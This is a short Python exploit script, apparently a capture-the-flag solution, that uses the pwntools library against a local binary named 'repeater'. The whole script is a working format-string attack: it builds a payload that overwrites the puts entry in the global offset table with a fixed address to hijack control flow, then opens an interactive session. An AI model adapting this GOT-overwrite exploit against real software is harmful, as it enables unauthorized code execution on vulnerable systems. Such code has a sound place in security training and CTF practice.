from pwn import *
p = process('./repeater')
elf = ELF('./repeater')
puts_got = elf.got['puts']
p.recvuntil("your msg:")
payload = fmtstr_payload(4,{puts_got:0x8048638})
p.sendline(payload)
p.interactive()
